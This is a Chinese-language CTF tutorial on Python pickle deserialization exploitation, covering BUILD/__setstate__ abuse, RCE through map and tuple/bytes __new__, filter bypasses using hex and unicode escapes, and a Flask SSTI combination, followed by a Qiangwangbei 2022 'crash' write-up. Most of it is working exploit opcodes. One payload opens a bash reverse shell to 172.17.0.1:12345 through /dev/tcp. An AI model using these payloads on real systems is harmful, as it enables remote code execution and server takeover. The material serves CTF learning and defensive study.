    #age: 10
在 pickle 源码中，字节码`b`对应的是`load_build()`函数
    def load_build(self):
            stack = self.stack
            state = stack.pop()
            # 首先获取栈上的字节码 b 前的一个元素，对于对象来说，该元素一般是存储有对象属性的dict
            inst = stack[-1]
            #获取该字典中键名为"__setstate__"的value
            setstate = getattr(inst, "__setstate__", None)
            #如果存在，则执行value(state)
            if setstate is not None:
                setstate(state)
                return
            slotstate = None
            if isinstance(state, tuple) and len(state) == 2:
                state, slotstate = state
            #如果"__setstate__"为空，则state与对象默认的__dict__合并，这一步其实就是将序列化前保存的持久化属性和对象属性字典合并
            if state:
                inst_dict = inst.__dict__
                intern = sys.intern
                for k, v in state.items():
                    if type(k) is str:
                        inst_dict[intern(k)] = v
                    else:
                        inst_dict[k] = v
            #如果__setstate__和__getstate__都没有设置，则加载默认__dict__
            if slotstate:
                for k, v in slotstate.items():
                    setattr(inst, k, v)
        dispatch[BUILD[0]] = load_build
根据上面代码的逻辑我们可以进行如下构造：
    o}(S"__setstate__"    # } 压入空dict __setstate__，然后 c push进去我们的 os.system
    cos
    system
    ubS"calc"  # 执行第一次 b ，因为现在并没有 b ，所以执行 __dict__.update，也就是将我们前面的 {"__setstate__":os.system} 写入了
                 # 压入命令再次执行 b 由于已经有了__setstate__，所以会将栈中字节码 b 的前一个元素当作 state，执行__setstate__(state)，
    b.
测试demo
    import pickle
    class Person:
        def __init__(self,age):
            self.age=age
    opcode=b'''(c__main__
    Person
    I18
    o}(S"__setstate__"
    cos
    system
    ubS"calc"
    b.'''
    p=pickle.loads(opcode)
    '''
        0: (    MARK
        1: c        GLOBAL     '__main__ Person'
       18: I        INT        18
       22: o        OBJ        (MARK at 0)
       23: }    EMPTY_DICT
       24: (    MARK
       25: S        STRING     '__setstate__'
       41: c        GLOBAL     'os system'
       52: u        SETITEMS   (MARK at 24)
       53: b    BUILD
       54: S    STRING     'calc'
       62: b    BUILD
       63: .    STOP
    highest protocol among opcodes = 1
    '''
##### 利用 python 内置函数绕过
这一部分就是考验 python 的基础了，题目的话可以参考 **美团CTF 2022 ezpickle** 和 蓝帽杯2022 file_session
关于 python 的内置函数可以移步官方文档 ，我们需要在这里面找到可以进行命令执行的函数，这里给出两个
    for x in map.__new__(map, eval, ['print(\'map\')']):  
        pass
    for x in filter.__new__(filter, eval, ['print(\'filter\')']):  
        pass
如上，但是这里是有一点问题的，这两个函数构建一个新的迭代器
这里构建的迭代器是不会立即触发的，在 python 中好像叫懒惰，我们需要再对迭代对象进行一步 `__next__` 才能将他触发
    r = map(eval, ['print(\'1\')'])
    r.__next__()
    r = filter(eval, ['print(\'2\')'])
    r.__next__()
而 `__next__` 我们可以对他进行一个跟踪，看文档就可以
Python/C API 中 Python 对象类型结构体的 [`tp_iternext`](https://docs.python.org/zh-cn/3/c-api/typeobj.html#c.PyTypeObject.tp_iternext "PyTypeObject.tp_iternext")
槽位
可以看到最下面，这里实际上也就是对应着 `PyIter_Next`
我们现在想要构造一个能够被调用的 pickle 反序列化的 payload 的时候，触发的方式就不能是再在后面拼接 `__next__()`
了，我们需要找一个能够触发 `PyIter_Next` 的方法：
    bytes.__new__(bytes, map.__new__(map, eval, ['print(1)']))  # bytes_new->PyBytes_FromObject->_PyBytes_FromIterator->PyIter_Next
    tuple.__new__(tuple, map.__new__(map, exec, ["print('1')"]))  # tuple_new_impl->PySequence_Tuple->PyIter_Next
也就是
    opcode=b'''c__builtin__
    map
    p0
    0(S'whoami'
    tp1
    0(cos
    system
    g1
    tp2
    0g0
    g2
    \x81p3
    0c__builtin__
    tuple
    p4
    (g3
    t\x81.'''
    pickle.loads(opcode)
    opcode=b'''c__builtin__
    map
    p0
    0(S'whoami'
    tp1
    0(cos
    system
    g1
    tp2
    0g0
    g2
    \x81p3
    0c__builtin__
    bytes
    p4
    (g3
    t\x81.'''
    pickle.loads(opcode)
用到的核心其实就是
    NEWOBJ         = b'\x81'  # build object by applying cls.__new__ to argtuple
#### 敏感字符 bypass
##### `S`
`S` 操作码本身是 String ，是支持十六进制的识别的
    S'flag' => S'\x66\x6c\x61\x67'
##### `V`
    UNICODE        = b'V'   # push Unicode string; raw-unicode-escaped'd argument
在指令集中存在一个 `V` 用于操作 Unicode 字符，对原本的 S 进行替换后即可在单引号内使用 Unicode 编码
    S'flag' => V'\u0066\u006C\u0061\u0067'
##### 利用内置函数取关键字
我们可以用 dir 列出 admin 模块的所有属性，我们需要的 secret 属性位于最后的位置，这个时候我们就可以利用函数将这里的 secret 取出来
    print(next(reversed(dir(sys.modules['admin']))))
    #secret
reversed 函数将 dir 得到的列表逆序，然后使用 next 取第一个即可，写到 opcode 中就是如下构造
    (((((c__main__
    admin
    i__builtin__
    dir
    i__builtin__
    reversed
    i__builtin__
    next
    .
#### flask 框架下结合 SSTI 进行 bypass
简单放一下 payload，大体的思路就是调用 flask.templating 的 render_template_string 来传入 SSTI 的相关
paylaod
    payload="cflask.templating\nrender_template_string\np0\n(S\"&#123;% for x in (().__class__.__base__.__subclasses__()) %&#125;&#123;%if x.__name__ =='catch_warnings'%&#125;&#123;&#123;x.__repr__.im_func.func_globals.linecache.os.system('bash -c \"bash -i >& /dev/tcp/172.17.0.1/12345 0>&1\" &')&#125;&#125;&#123;%endif%&#125;&#123;%endfor%&#125;\"\np1\ntp2\nRp3\n."
## 题目整理
#### 强网杯 2022 crash
题目给出了源码
    import base64
    # import sqlite3
    import pickle
    from flask import Flask, make_response,request, session
    import admin
    import random
    app = Flask(__name__,static_url_path='')
    app.secret_key=random.randbytes(12)
    class User:
        def __init__(self, username,password):
            self.username=username
            self.token=hash(password)
    def get_password(username):
        if username=="admin":
            return admin.secret
        else:
            # conn=sqlite3.connect("user.db")
            # cursor=conn.cursor()
            # cursor.execute(f"select password from usertable where username='{username}'")
            # data=cursor.fetchall()[0]
            # if data:
            #     return data[0]
            # else:
            #     return None
            return session.get("password")
    @app.route('/balancer', methods=['GET', 'POST'])
    def flag():
        pickle_data=base64.b64decode(request.cookies.get("userdata"))
        if b'R' in pickle_data or b"secret" in pickle_data:
            return "You damm hacker!"
        os.system("rm -rf *py*")
        userdata=pickle.loads(pickle_data)
        if userdata.token!=hash(get_password(userdata.username)):
             return "Login First"
        if userdata.username=='admin':
            return "Welcome admin, here is your next challenge!"
        return "You're not admin!"
    @app.route('/login', methods=['GET', 'POST'])
    def login():
        resp = make_response("success")
        session["password"]=request.values.get("password")
        resp.set_cookie("userdata", base64.b64encode(pickle.dumps(User(request.values.get("username"),request.values.get("password")),2)), max_age=3600)
        return resp
    @app.route('/', methods=['GET', 'POST'])
    def index():
        return open('source.txt',"r").read()
    if __name__ == '__main__':
        app.run(host='0.0.0.0', port=5000)
这里我们只写用到 pickle 反序列化的部分，我们希望通过覆盖属性的方式来获得一个已知的 secret，可以看到黑名单：
    if b'R' in pickle_data or b"secret" in pickle_data:
不能用 R 指令码，不能含有要覆盖的 secret 关键字，绕过这两处即可
    b'''capp
    admin
    (Vsecr\u0065t
    I1
    db0(capp
    User
    S"admin"
    I1
    o.'''
或者
    b'''capp
    admin
    (S'\x73ecret'
    I1
    db0(capp
    User
    S"admin"